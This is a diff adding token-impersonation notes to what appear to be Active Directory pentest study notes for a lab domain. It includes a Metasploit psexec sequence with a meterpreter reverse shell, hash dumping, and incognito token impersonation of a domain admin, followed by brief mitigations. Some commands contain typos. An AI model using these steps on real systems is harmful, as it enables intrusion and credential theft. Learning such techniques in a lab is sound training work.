@@ -66,6 +66,57 @@ $psexec.py "frank castle":@192.168.57.141 -hashes LMHASH:NTHASH
 *Utilize strong passwords
 
 ---------------------------------------------------------TOKEN IMPERSONATION OVERVIEW----------------------------------------
+Token - Temporary keys that allow you access to a system/network without having 
+to provide credentials each time you access a file.(cookies)
+
+two types:1.Delegate - created for logging into a machine 2.Impersonate - non interactive such as attaching a network drive.
+
+1.pop a shell and load incognito
+2.Impersonate our domain user
+3.Attempt to dump hashes as non domain admin
+
+1.identify domain administrator
+2.Impersonate our domain admin
+3.attempt to dump hashes as domain admin
+
+-----------------------------------------------------------TOKEN IMPERSONATION WITH INCOGNITO---------------------------------------------
+$MSFCONSOLE
+$use exploit/windows/smb/psexec
+$options
+$set rhosts 192.168.57.141
+$set smbdomain marvel.local
+$set smbpass Password1
+$set smbuserfcastle
+$show targets
+$set targets 2
+$options
+$set payload windows/x64/meterpreter/reverse_tcp
+$options
+$set lhosts eth0
+$options
+$run
+
+got meterpreter shell
+
+hashdump
+getuid
+sysinfo
+getuid
+
+$load incognito
+$list_token -u
+$impersonate_token marvel\\adminostrator
+
+$rev2self
+$hashdump
+
+------------------------------------------------------Token Impersonation--------------------------------------------
+1.limit user/group token creation permissions
+2.account tiering
+3.localadmin restriction
+
+-------------------------------------------------------Kerberoasting------------------------------------------------
+
 
 
 
